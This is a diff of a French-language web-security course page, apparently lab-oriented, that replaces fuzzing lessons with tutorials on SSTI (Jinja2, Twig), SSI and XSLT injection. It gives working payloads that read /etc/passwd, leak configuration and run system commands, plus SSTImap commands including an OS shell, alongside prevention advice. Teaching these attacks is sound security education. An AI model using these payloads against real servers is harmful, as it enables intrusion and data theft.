-    <pre><code>-mc 200        # match code
--fc 404        # exclude code
--fs 0-1000     # filter size
--mt >500       # réponse lente</code></pre>
-
-    <p>
-      Exemple :
-    </p>
-
-    <pre><code>ffuf -u http://TARGET/FUZZ \
--w wordlist.txt \
--mc 200 \
--fc 404</code></pre>
-
-    <p>
-      💡 Sans filtre = trop de faux positifs
-    </p>
-  </section>
-
-  <!-- ===== VALIDATION ===== -->
-  <section class="course-section">
-    <h2>✅ Validation des résultats</h2>
-
-    <p>
-      Tous les résultats ne sont pas des failles.
-    </p>
-
-    <p>
-      Il faut valider manuellement.
-    </p>
-
-    <h3>Étapes</h3>
-
-    <ol>
-      <li>Reproduire la requête</li>
-      <li>Analyser la réponse</li>
-      <li>Tester l’impact</li>
-    </ol>
-
-    <pre><code>curl http://TARGET/backup/</code></pre>
-
-    <p>
-      🔎 Vérifier :
-    </p>
-
-    <ul>
-      <li>Content-Length</li>
-      <li>Content-Type</li>
-      <li>Présence de fichiers sensibles</li>
-    </ul>
-
-    <p>
-      ⚠️ Toujours rester éthique (CTF / lab uniquement)
-    </p>
-  </section>
-
-  <!-- ===== WEB APIs ===== -->
-  <section class="course-section">
-    <h2>🔌 Web APIs</h2>
-
-    <p>
-      Une API permet à des applications de communiquer entre elles.
-    </p>
-
-    <h3>Types</h3>
-
-    <ul>
-      <li><strong>REST</strong> → JSON, endpoints multiples</li>
-      <li><strong>SOAP</strong> → XML, structure stricte</li>
-      <li><strong>GraphQL</strong> → requêtes flexibles</li>
-    </ul>
-
-    <p>
-      Exemple REST :
-    </p>
-
-    <pre><code>GET /users/123</code></pre>
-
-    <p>
-      🧠 Différence avec un site classique :
-    </p>
-
-    <ul>
-      <li>Site → HTML</li>
-      <li>API → JSON / XML</li>
-    </ul>
-  </section>
-
-  <!-- ===== ENDPOINT DISCOVERY ===== -->
-  <section class="course-section">
-    <h2>🎯 Identification des endpoints</h2>
-
-    <p>
-      Avant de fuzz une API, il faut trouver ses endpoints.
-    </p>
-
-    <h3>Méthodes</h3>
-
-    <ul>
-      <li>Documentation (Swagger)</li>
-      <li>Analyse réseau (Burp Suite)</li>
-      <li>Fuzzing des paramètres</li>
-    </ul>
-
-    <p>
-      Exemple :
-    </p>
-
-    <pre><code>/users
-/users/123
-/products/456</code></pre>
-  </section>
-
-  <!-- ===== SOAP & GRAPHQL ===== -->
-  <section class="course-section">
-    <h2>🧩 SOAP & GraphQL Fuzzing</h2>
-
-    <h3>🔎 Découverte des endpoints SOAP</h3>
-    <p>
-      Les API SOAP utilisent des fichiers <strong>WSDL</strong> pour définir leur structure.
-    </p>
-
-    <ul>
-      <li>Opérations disponibles (endpoints)</li>
-      <li>Paramètres d’entrée et de sortie</li>
-      <li>Types de données</li>
-      <li>URL du service</li>
-    </ul>
-
-    <p>
-      🛠️ Méthodes :
-    </p>
-    <ul>
-      <li>Analyse du fichier WSDL</li>
-      <li>Sniff réseau (Wireshark, tcpdump)</li>
-      <li>Fuzzing des paramètres XML</li>
-    </ul>
-
-    <h3>⚡ GraphQL</h3>
-    <p>
-      Contrairement à REST, GraphQL utilise un <strong>seul endpoint</strong> (souvent <code>/graphql</code>).
-    </p>
-
-    <h4>📥 Exemple de requête</h4>
-    <pre><code>query {
-  user(id: 123) {
-    name
-    email
-  }
-}</code></pre>
-
-    <h4>✏️ Mutation</h4>
-    <pre><code>mutation {
-  createPost(title: "Test") {
-    id
-  }
-}</code></pre>
-
-    <p>
-      🔍 Découverte :
-    </p>
-    <ul>
-      <li>Introspection GraphQL</li>
-      <li>Documentation (GraphiQL)</li>
-      <li>Analyse du trafic réseau</li>
-    </ul>
-  </section>
-
-  <!-- ===== API FUZZING ===== -->
-  <section class="course-section">
-    <h2>🚀 API Fuzzing</h2>
-
-    <p>
-      Le <strong>API fuzzing</strong> consiste à tester automatiquement les endpoints d’une API
-      avec des requêtes modifiées pour détecter des vulnérabilités.
-    </p>
-
-    <h3>🎯 Objectifs</h3>
-    <ul>
-      <li>Trouver des endpoints cachés</li>
-      <li>Tester la robustesse</li>
-      <li>Détecter des injections</li>
-      <li>Simuler un attaquant réel</li>
-    </ul>
-
-    <h3>🧪 Types de fuzzing API</h3>
-
-    <h4>1️⃣ Parameter Fuzzing</h4>
-    <p>Tester différentes valeurs pour un paramètre :</p>
-    <pre><code>?id=FUZZ</code></pre>
-
-    <h4>2️⃣ Data Format Fuzzing</h4>
-    <p>Modifier le JSON / XML :</p>
-    <pre><code>{
-  "id": "AAAAA"
-}</code></pre>
-
-    <h4>3️⃣ Sequence Fuzzing</h4>
-    <p>
-      Tester l’ordre des requêtes (important pour les APIs complexes).
-    </p>
-  </section>
-
-  <!-- ===== API ENUMERATION ===== -->
-  <section class="course-section">
-    <h2>🔍 Découverte d’API (Endpoints)</h2>
-
-    <p>
-      Une API peut contenir des endpoints cachés non documentés.
-    </p>
-
-    <h3>📚 Exemple d’API</h3>
-    <ul>
-      <li>GET / → accueil</li>
-      <li>GET /items/{id}</li>
-      <li>POST /items</li>
-      <li>PUT /items/{id}</li>
-      <li>DELETE /items/{id}</li>
-    </ul>
-
-    <p>
-      ⚠️ Certains endpoints peuvent être cachés !
-    </p>
-
-    <h3>🛠️ Fuzzer une API</h3>
-
-    <pre><code>git clone https://github.com/PandaSt0rm/webfuzz_api.git
-cd webfuzz_api
+  <p>
+    Maintenant que nous avons identifié le moteur de template utilisé par l’application web vulnérable à la SSTI,
+    nous pouvons passer à son exploitation.
+    Dans cette section, nous supposons que le moteur utilisé est <strong>Jinja2</strong>,
+    couramment employé dans des frameworks Python tels que Flask ou Django.
+  </p>
+
+  <p>
+    Les payloads présentés ici se basent sur un environnement Flask.
+    Selon le framework Python utilisé, certains détails peuvent varier.
+  </p>
+
+  <p>
+    Dans nos payloads, nous pouvons utiliser n’importe quelle bibliothèque déjà importée par l’application Python,
+    directement ou indirectement.
+    Il est également possible d’importer des bibliothèques supplémentaires via l’instruction <code>import</code>.
+  </p>
+
+  <h3>Information Disclosure</h3>
+
+  <p>
+    Une SSTI permet d’obtenir des informations internes sur l’application, comme sa configuration ou son code source.
+    Par exemple, pour afficher la configuration Flask, on peut utiliser :
+  </p>
+
+  <pre><code>{{ config.items() }}</code></pre>
+
+  <p>
+    Ce payload divulgue l’intégralité de la configuration, y compris d’éventuelles clés secrètes,
+    ce qui peut faciliter des attaques ultérieures.
+  </p>
+
+  <p>
+    On peut également accéder aux fonctions Python internes via l’objet <code>__builtins__</code> :
+  </p>
+
+  <pre><code>{{ self.__init__.__globals__.__builtins__ }}</code></pre>
+
+  <p>
+    Cela permet d’explorer les fonctions disponibles et de préparer des attaques plus avancées.
+  </p>
+
+  <h3>Local File Inclusion (LFI)</h3>
+
+  <p>
+    Grâce à la fonction Python <code>open()</code>, il est possible de lire des fichiers locaux.
+    Comme elle n’est pas directement accessible, il faut la récupérer depuis <code>__builtins__</code>.
+  </p>
+
+  <p><strong>Exemple : lecture de <code>/etc/passwd</code></strong></p>
+
+  <pre><code>{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}</code></pre>
+
+  <p>
+    Ce payload lit et affiche le contenu du fichier, permettant d’obtenir des informations sensibles
+    sur le système.
+  </p>
+
+  <h3>Remote Code Execution (RCE)</h3>
+
+  <p>
+    Pour exécuter des commandes système, on peut utiliser la bibliothèque Python <code>os</code>
+    (fonctions <code>system</code>, <code>popen</code>, etc.).
+    Si elle n’est pas importée, il est possible de l’importer via la fonction <code>__import__</code>.
+  </p>
+
+  <p>
+    Le payload général pour importer une bibliothèque et exécuter une commande suit ce schéma :
+  </p>
+
+  <pre><code>{{ self.__init__.__globals__.__builtins__.__import__("os").popen("COMMAND").read() }}</code></pre>
+
+  <p>
+    En remplaçant <code>COMMAND</code> par une commande système, l’application exécutera cette commande
+    lors du rendu du template.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploiting SSTI – Twig</h2>
+
+  <p>
+    Dans cette section, nous explorons un second exemple d’exploitation SSTI.
+    Après avoir étudié l’exploitation SSTI dans le moteur Jinja2, nous allons maintenant analyser
+    l’exploitation dans <strong>Twig</strong>, un moteur de template utilisé dans les applications PHP.
+    Comme précédemment, nous supposons que la confirmation SSTI et l’identification du moteur
+    ont déjà été réalisées.
+  </p>
+
+  <h3>Information Disclosure</h3>
+
+  <p>
+    Twig permet d’obtenir quelques informations internes via le mot‑clé <code>_self</code> :
+  </p>
+
+  <pre><code>{{ _self }}</code></pre>
+
+  <p>
+    Cependant, contrairement à Jinja2, les informations divulguées sont limitées.
+  </p>
+
+  <h3>Local File Inclusion (LFI)</h3>
+
+  <p>
+    Twig, en lui‑même, ne permet pas de lire des fichiers locaux via ses fonctions internes.
+    Toutefois, certains frameworks PHP — comme Symfony — ajoutent des filtres supplémentaires.
+    L’un d’eux, <code>file_excerpt</code>, permet de lire des fichiers locaux :
+  </p>
+
+  <pre><code>{{ "/etc/passwd"|file_excerpt(1, -1) }}</code></pre>
+
+  <p>
+    Ce payload lit le fichier <code>/etc/passwd</code> et en affiche le contenu.
+  </p>
+
+  <h3>Remote Code Execution (RCE)</h3>
+
+  <p>
+    Pour obtenir une exécution de code à distance, on peut utiliser des fonctions internes de PHP,
+    comme <code>system</code>.
+    Twig permet d’appeler des fonctions PHP via son filtre <code>filter</code>.
+  </p>
+
+  <p><strong>Exemple de payload RCE :</strong></p>
+
+  <pre><code>{{ ['id'] | filter('system') }}</code></pre>
+
+  <p>
+    Ce payload exécute la commande <code>id</code> et affiche les informations de l’utilisateur
+    sous lequel tourne le serveur (souvent <code>www-data</code>).
+  </p>
+
+  <h3>Further Remarks</h3>
+
+  <p>
+    Dans ce module, nous avons exploré l’exploitation SSTI dans les moteurs Jinja2 et Twig.
+    Comme nous l’avons vu, la syntaxe et les capacités diffèrent selon le moteur,
+    mais le principe général reste le même :
+    <strong>si l’attaquant contrôle le template, il contrôle le code exécuté par le moteur</strong>.
+  </p>
+
+  <p>
+    Pour exploiter un moteur inconnu, il suffit souvent de consulter sa documentation ou d’utiliser
+    des ressources comme le <em>PayloadsAllTheThings – SSTI Cheat Sheet</em>,
+    qui regroupe des payloads pour les moteurs de template les plus courants.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>SSTI Tools of the Trade & Preventing SSTI</h2>
+
+  <p>
+    Cette section présente les outils permettant d’identifier et d’exploiter des vulnérabilités SSTI.
+    Nous verrons également les principales mesures de prévention.
+  </p>
+
+  <h3>Tools of the Trade</h3>
+
+  <p>
+    L’outil historique pour l’identification et l’exploitation des SSTI était <strong>tplmap</strong>.
+    Cependant, il n’est plus maintenu et repose sur Python 2.
+    Nous utiliserons donc <strong>SSTImap</strong>, une version moderne et maintenue.
+  </p>
+
+  <p><strong>Installation :</strong></p>
+
+  <pre><code>git clone https://github.com/vladko312/SSTImap
+cd SSTImap
 pip3 install -r requirements.txt
+python3 sstimap.py
+</code></pre>
 
-python3 api_fuzzer.py http://IP:PORT</code></pre>
+  <p>
+    Une fois lancé, SSTImap charge ses plugins et attend une URL cible.
+    Pour identifier automatiquement une SSTI et déterminer le moteur de template utilisé :
+  </p>
 
-    <h3>📊 Résultat</h3>
+  <pre><code>python3 sstimap.py -u http://172.17.0.2/index.php?name=test</code></pre>
 
-    <pre><code>Found valid endpoints:
-- /docs
-- /secret_endpoint</code></pre>
+  <p><strong>Exemple de résultat :</strong></p>
 
-    <p>
-      💡 Endpoint caché trouvé → accès possible à une <strong>flag</strong>
-    </p>
-  </section>
+  <pre><code>Engine: Twig
+Injection: *
+Capabilities:
+  Shell command execution: ok
+  File write: ok
+  File read: ok
+  Code evaluation: ok
+</code></pre>
 
-  <!-- ===== VALIDATION ===== -->
-  <section class="course-section">
-    <h2>✅ Validation des résultats</h2>
+  <p>
+    SSTImap confirme la SSTI, identifie Twig et liste les capacités exploitables.
+  </p>
 
-    <p>
-      Le fuzzing génère souvent des <strong>faux positifs</strong>.
-      Il faut toujours vérifier manuellement.
-    </p>
+  <h4>Lire un fichier distant</h4>
 
-    <h3>🛠️ Méthode</h3>
-    <ol>
-      <li>Reproduire avec curl</li>
-      <li>Analyser la réponse</li>
-      <li>Confirmer la vulnérabilité</li>
-    </ol>
+  <pre><code>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'</code></pre>
 
-    <h3>📌 Exemple</h3>
+  <p><strong>Exécuter une commande système :</strong></p>
 
-    <pre><code>curl http://IP:PORT/backup/</code></pre>
+  <pre><code>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id</code></pre>
 
-    <p>
-      Si tu vois une liste de fichiers → vulnérabilité confirmée ⚠️
-    </p>
+  <p><strong>Obtenir un shell interactif :</strong></p>
 
-    <h3>🔎 Headers utiles</h3>
+  <pre><code>python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell</code></pre>
 
-    <pre><code>curl -I http://IP:PORT/backup/password.txt</code></pre>
+  <h3>Preventing SSTI</h3>
 
-    <ul>
-      <li>Content-Type</li>
-      <li>Content-Length</li>
-    </ul>
+  <p>
+    Pour prévenir les vulnérabilités SSTI, il faut garantir que l’entrée utilisateur n’est <strong>jamais</strong>
+    injectée dans le template avant le rendu.
+    L’utilisateur doit uniquement fournir des <em>valeurs</em> au moteur de template, jamais du code.
+  </p>
 
-    <p>
-      💡 Permet d’analyser sans exposer les données sensibles
-    </p>
-  </section>
+  <ul>
+    <li>
+      <strong>Ne jamais insérer directement des données utilisateur dans un template.</strong><br>
+      Vérifier tous les chemins d’exécution pour s’assurer qu’aucune concaténation dangereuse n’a lieu.
+    </li>
 
-  <a href="{% url 'portfolio:web_fuzzing_exploit' %}" class="course-btn">
-    ⚠️ Voir le walkthrough technique
-  </a>
+    <li>
+      <strong>Si l’application permet de modifier des templates :</strong><br>
+      appliquer un durcissement strict du moteur (suppression des fonctions dangereuses).
+    </li>
+
+    <li>
+      <strong>Isoler l’environnement d’exécution du moteur de template :</strong><br>
+      par exemple en utilisant un conteneur Docker dédié, séparé du serveur web.
+    </li>
+
+    <li>
+      <strong>Limiter les fonctions disponibles dans le moteur de template.</strong><br>
+      Même si cette technique peut être contournée, elle réduit la surface d’attaque.
+    </li>
+  </ul>
+
+  <p>
+    La meilleure approche reste une séparation stricte entre le moteur de template et le serveur web,
+    empêchant toute compromission du système principal en cas d’exploitation SSTI.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Introduction to SSI Injection</h2>
+
+  <p>
+    Les <strong>Server-Side Includes (SSI)</strong> sont une technologie permettant aux applications web
+    d’ajouter du contenu dynamique dans des pages HTML statiques.
+    SSI est supporté par de nombreux serveurs web tels qu’Apache et IIS.
+  </p>
+
+  <p>
+    L’utilisation de SSI peut parfois être déduite de l’extension du fichier
+    (<code>.shtml</code>, <code>.shtm</code>, <code>.stm</code>).
+    Cependant, un serveur peut être configuré pour interpréter des directives SSI dans n’importe quelle extension.
+    Ainsi, l’extension seule ne permet pas de conclure à l’utilisation de SSI.
+  </p>
+
+  <h3>SSI Directives</h3>
+
+  <p>
+    Les directives SSI permettent d’ajouter du contenu dynamique dans une page HTML statique.
+    Elles sont composées de :
+  </p>
+
+  <ul>
+    <li><strong>name</strong> — le nom de la directive</li>
+    <li><strong>parameter name</strong> — un ou plusieurs paramètres</li>
+    <li><strong>value</strong> — une ou plusieurs valeurs</li>
+  </ul>
+
+  <p><strong>Syntaxe générale :</strong></p>
+
+  <pre><code>&lt;!--#name param1="value1" param2="value2" --&gt;</code></pre>
+
+  <h4>Directives courantes</h4>
+
+  <p><strong>printenv</strong> — affiche les variables d’environnement :</p>
+  <pre><code>&lt;!--#printenv --&gt;</code></pre>
+
+  <p><strong>config</strong> — modifie la configuration SSI :</p>
+  <pre><code>&lt;!--#config errmsg="Error!" --&gt;</code></pre>
+
+  <p><strong>echo</strong> — affiche la valeur d’une variable :</p>
+  <pre><code>&lt;!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" --&gt;</code></pre>
+
+  <p><strong>exec</strong> — exécute une commande système :</p>
+  <pre><code>&lt;!--#exec cmd="whoami" --&gt;</code></pre>
+
+  <p><strong>include</strong> — inclut un fichier du répertoire web root :</p>
+  <pre><code>&lt;!--#include virtual="index.html" --&gt;</code></pre>
+
+  <h3>SSI Injection</h3>
+
+  <p>
+    Une <strong>SSI Injection</strong> se produit lorsqu’un attaquant parvient à injecter des directives SSI
+    dans un fichier qui sera ensuite interprété par le serveur web.
+    Lorsque ce fichier est servi, les directives malveillantes sont exécutées.
+  </p>
+
+  <p>
+    Ce type de vulnérabilité peut apparaître dans plusieurs scénarios :
+  </p>
+
+  <ul>
+    <li>
+      <strong>Upload de fichier vulnérable</strong> :
+      si l’application permet d’envoyer un fichier dans le web root, un attaquant peut y inclure des directives SSI.
+    </li>
+
+    <li>
+      <strong>Écriture de données utilisateur dans un fichier servi par le serveur</strong> :
+      si l’application écrit du contenu contrôlé par l’utilisateur dans un fichier accessible publiquement,
+      l’attaquant peut y injecter des directives SSI.
+    </li>
+  </ul>
+
+  <p>
+    Une fois injectées, ces directives peuvent permettre d’afficher des variables internes,
+    lire des fichiers, ou même exécuter des commandes système selon la configuration du serveur.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploiting SSI Injection</h2>
+
+  <p>
+    Maintenant que nous avons vu le fonctionnement des Server-Side Includes (SSI),
+    examinons comment exploiter une vulnérabilité d’<strong>SSI Injection</strong>.
+  </p>
+
+  <h3>Exploitation</h3>
+
+  <p>
+    Dans notre application web d’exemple, nous sommes accueillis par un simple formulaire demandant un nom :
+  </p>
+
+  <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></pre>
+
+  <p>
+    Après avoir soumis un nom, nous sommes redirigés vers <code>/page.shtml</code>,
+    qui affiche un message de bienvenue ainsi que des informations générales.
+  </p>
+
+  <p>
+    L’extension <code>.shtml</code> suggère que la page utilise les SSI.
+    Si le nom fourni par l’utilisateur est inséré dans la page sans filtrage,
+    il peut être possible d’injecter des directives SSI.
+  </p>
+
+  <h4>Test de l’injection SSI</h4>
+
+  <p>
+    Pour vérifier la vulnérabilité, testons l’injection suivante comme nom :
+  </p>
+
+  <pre><code>&lt;!--#printenv --&gt;</code></pre>
+
+  <p>
+    Le résultat affiche les variables d’environnement, confirmant que la directive est exécutée.
+    Nous avons donc une <strong>SSI Injection</strong>.
+  </p>
+
+  <h4>Exécution de commandes</h4>
+
+  <p>
+    Pour vérifier si nous pouvons exécuter des commandes système, testons la directive <code>exec</code> :
+  </p>
+
+  <pre><code>&lt;!--#exec cmd="id" --&gt;</code></pre>
+
+  <p>
+    La page affiche alors les informations de l’utilisateur système (souvent <code>www-data</code>),
+    confirmant que le serveur exécute bien la commande injectée.
+  </p>
+
+  <p>
+    À ce stade, l’attaquant peut exécuter des commandes arbitraires, ce qui lui donne un contrôle complet
+    sur le serveur web selon les permissions du processus.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Preventing SSI Injection</h2>
+
+  <p>
+    Comme nous l’avons vu, une mauvaise implémentation des Server-Side Includes (SSI) peut introduire
+    des vulnérabilités graves.
+    Une <strong>SSI Injection</strong> peut mener à l’exécution de commandes système et potentiellement
+    au contrôle total du serveur web.
+    Il est donc essentiel de mettre en place des mesures de sécurité adaptées.
+  </p>
+
+  <h3>Prevention</h3>
+
+  <p>
+    Comme pour toute vulnérabilité d’injection, la première ligne de défense consiste à
+    <strong>valider et assainir soigneusement les entrées utilisateur</strong>.
+    Cela est particulièrement important lorsque :
+  </p>
+
+  <ul>
+    <li>l’entrée utilisateur est utilisée dans une directive SSI,</li>
+    <li>l’entrée utilisateur est écrite dans un fichier susceptible d’être interprété par le serveur web.</li>
+  </ul>
+
+  <p>
+    Il est également crucial de <strong>configurer correctement le serveur web</strong> afin de limiter
+    l’utilisation des SSI :
+  </p>
+
+  <ul>
+    <li>
+      <strong>Restreindre les SSI à des extensions spécifiques</strong>
+      (par exemple uniquement <code>.shtml</code>), afin d’éviter que des fichiers inattendus
+      ne soient interprétés comme des templates SSI.
+    </li>
+
+    <li>
+      <strong>Limiter les SSI à certains répertoires</strong>
+      pour empêcher l’exécution de directives dans des zones sensibles du site.
+    </li>
+
+    <li>
+      <strong>Désactiver les directives dangereuses</strong>
+      comme <code>exec</code> si elles ne sont pas strictement nécessaires.
+      Cela réduit considérablement l’impact potentiel d’une injection.
+    </li>
+  </ul>
+
+  <p>
+    Enfin, une approche plus robuste consiste à <strong>isoler l’environnement d’exécution</strong>
+    dans lequel les SSI sont interprétés.
+    Par exemple, exécuter les pages SSI dans un conteneur ou un environnement séparé du serveur principal
+    permet de limiter les dégâts en cas d’exploitation.
+  </p>
+
+  <p>
+    En combinant une configuration serveur stricte, une validation d’entrée rigoureuse
+    et une isolation de l’environnement, il est possible de réduire drastiquement
+    les risques liés aux SSI injections.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Introduction to XSLT Injection</h2>
+
+  <p>
+    Le langage <strong>eXtensible Stylesheet Language Transformation (XSLT)</strong> permet de transformer
+    des documents XML.
+    Il peut, par exemple, sélectionner des nœuds spécifiques dans un document XML ou modifier sa structure.
+  </p>
+
+  <h3>eXtensible Stylesheet Language Transformation (XSLT)</h3>
+
+  <p>
+    Pour comprendre le fonctionnement d’XSLT, considérons le document XML suivant :
+  </p>
+
+  <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;fruits&gt;
+    &lt;fruit&gt;
+        &lt;name&gt;Apple&lt;/name&gt;
+        &lt;color&gt;Red&lt;/color&gt;
+        &lt;size&gt;Medium&lt;/size&gt;
+    &lt;/fruit&gt;
+    &lt;fruit&gt;
+        &lt;name&gt;Banana&lt;/name&gt;
+        &lt;color&gt;Yellow&lt;/color&gt;
+        &lt;size&gt;Medium&lt;/size&gt;
+    &lt;/fruit&gt;
+    &lt;fruit&gt;
+        &lt;name&gt;Strawberry&lt;/name&gt;
+        &lt;color&gt;Red&lt;/color&gt;
+        &lt;size&gt;Small&lt;/size&gt;
+    &lt;/fruit&gt;
+&lt;/fruits&gt;
+</code></pre>
+
+  <p>
+    Un document XSLT définit un format de sortie enrichi avec les données du document XML.
+    Il ressemble à du XML, mais utilise des éléments XSL préfixés par <code>xsl:</code>.
+  </p>
+
+  <p><strong>Éléments XSL courants :</strong></p>
+
+  <ul>
+    <li><code>&lt;xsl:template&gt;</code> — définit un template appliqué à un nœud XML.</li>
+    <li><code>&lt;xsl:value-of&gt;</code> — extrait la valeur d’un nœud XML.</li>
+    <li><code>&lt;xsl:for-each&gt;</code> — boucle sur une liste de nœuds.</li>
+  </ul>
+
+  <p><strong>Exemple simple : afficher tous les fruits et leur couleur</strong></p>
+
+  <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+    &lt;xsl:template match="/fruits"&gt;
+        Here are all the fruits:
+        &lt;xsl:for-each select="fruit"&gt;
+            &lt;xsl:value-of select="name"/&gt; (&lt;xsl:value-of select="color"/&gt;)
+        &lt;/xsl:for-each&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+
+  <p><strong>Résultat :</strong></p>
+
+  <pre><code>Here are all the fruits:
+    Apple (Red)
+    Banana (Yellow)
+    Strawberry (Red)
+</code></pre>
+
+  <h4>Éléments XSL supplémentaires</h4>
+
+  <ul>
+    <li><code>&lt;xsl:sort&gt;</code> — trie les éléments dans une boucle.</li>
+    <li><code>&lt;xsl:if&gt;</code> — applique une condition sur un nœud.</li>
+  </ul>
+
+  <p><strong>Exemple : fruits de taille Medium triés par couleur (descendant)</strong></p>
+
+  <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+    &lt;xsl:template match="/fruits"&gt;
+        Here are all fruits of medium size ordered by their color:
+        &lt;xsl:for-each select="fruit"&gt;
+            &lt;xsl:sort select="color" order="descending" /&gt;
+            &lt;xsl:if test="size = 'Medium'"&gt;
+                &lt;xsl:value-of select="name"/&gt; (&lt;xsl:value-of select="color"/&gt;)
+            &lt;/xsl:if&gt;
+        &lt;/xsl:for-each&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+
+  <p><strong>Résultat :</strong></p>
+
+  <pre><code>Here are all fruits of medium size ordered by their color:
+    Banana (Yellow)
+    Apple (Red)
+</code></pre>
+
+  <p>
+    XSLT peut générer n’importe quel type de sortie, y compris du HTML.
+    C’est pourquoi certaines applications web l’utilisent pour intégrer des données XML dans des réponses dynamiques.
+  </p>
+
+  <h3>XSLT Injection</h3>
+
+  <p>
+    Une <strong>XSLT Injection</strong> survient lorsque des données utilisateur sont insérées dans un document XSL
+    avant que le processeur XSLT ne génère la sortie.
+    L’attaquant peut alors injecter des éléments XSL supplémentaires, qui seront exécutés lors du traitement.
+  </p>
+
+  <p>
+    Cela peut permettre d’accéder à des données sensibles, de contourner des restrictions,
+    ou même d’exécuter du code selon les capacités du processeur XSLT utilisé.
+  </p>
+
+</section>
+  <section class="tools-section">
+
+  <h2>Exploiting XSLT Injection</h2>
+
+  <p>
+    Après avoir étudié les bases d’XSLT et son fonctionnement, examinons maintenant comment exploiter
+    une vulnérabilité d’<strong>XSLT Injection</strong>.
+  </p>
+
+  <h3>Identifying XSLT Injection</h3>
+
+  <p>
+    Notre application web d’exemple affiche une liste de modules Academy.
+    En bas de la page, un champ permet de personnaliser le titre en fournissant un nom.
+  </p>
+
+  <p>
+    Si l’application utilise un document XML combiné à un traitement XSLT, et que le nom fourni est inséré
+    dans le XSL sans filtrage, une XSLT injection peut être possible.
+  </p>
+
+  <p>
+    Pour tester cela, nous injectons un tag XML cassé, par exemple :
+  </p>
+
+  <pre><code>&lt;</code></pre>
+
+  <p>
+    La réponse renvoie une erreur <strong>500 Internal Server Error</strong>.
+    Cela ne confirme pas encore la vulnérabilité, mais indique un comportement anormal
+    pouvant résulter d’un traitement XSLT.
+  </p>
+
+  <h3>Information Disclosure</h3>
+
+  <p>
+    Pour confirmer l’injection, nous pouvons tenter d’injecter des éléments XSLT valides,
+    par exemple pour récupérer des informations sur le processeur XSLT :
+  </p>
+
+  <pre><code>Version: &lt;xsl:value-of select="system-property('xsl:version')" /&gt;
+Vendor: &lt;xsl:value-of select="system-property('xsl:vendor')" /&gt;
+Vendor URL: &lt;xsl:value-of select="system-property('xsl:vendor-url')" /&gt;
+Product Name: &lt;xsl:value-of select="system-property('xsl:product-name')" /&gt;
+Product Version: &lt;xsl:value-of select="system-property('xsl:product-version')" /&gt;
+</code></pre>
+
+  <p>
+    La page affiche alors les informations du processeur XSLT, confirmant l’injection.
+    Dans notre exemple, le moteur utilisé est <strong>libxslt</strong> en version XSLT 1.0.
+  </p>
+
+  <h3>Local File Inclusion (LFI)</h3>
+
+  <p>
+    Plusieurs fonctions peuvent permettre de lire des fichiers locaux, selon la version XSLT
+    et la configuration du processeur.
+  </p>
+
+  <p>
+    Par exemple, XSLT 2.0 introduit la fonction <code>unparsed-text()</code> :
+  </p>
+
+  <pre><code>&lt;xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" /&gt;</code></pre>
+
+  <p>
+    Mais notre application utilise XSLT 1.0, donc cette fonction échoue.
+  </p>
+
+  <p>
+    Cependant, si le processeur XSLT est configuré pour supporter les fonctions PHP,
+    nous pouvons utiliser <code>php:function()</code> pour lire un fichier :
+  </p>
+
+  <pre><code>&lt;xsl:value-of select="php:function('file_get_contents','/etc/passwd')" /&gt;</code></pre>
+
+  <p>
+    Dans notre exemple, cette fonction est supportée, et le contenu du fichier est affiché.
+  </p>
+
+  <h3>Remote Code Execution (RCE)</h3>
+
+  <p>
+    Si les fonctions PHP sont disponibles, il est également possible d’exécuter des commandes système.
+    Par exemple, en appelant la fonction PHP <code>system()</code> :
+  </p>
+
+  <pre><code>&lt;xsl:value-of select="php:function('system','id')" /&gt;</code></pre>
+
+  <p>
+    La page affiche alors le résultat de la commande <code>id</code>, confirmant une exécution de code à distance.
+  </p>
+
+  <p>
+    Une XSLT injection avec support des fonctions PHP peut donc mener à une compromission complète du serveur.
+  </p>
+
+</section>
   <!-- ===== DISCLAIMER ===== -->
   <div class="course-disclaimer">
     ⚠️ Contenu éducatif uniquement.
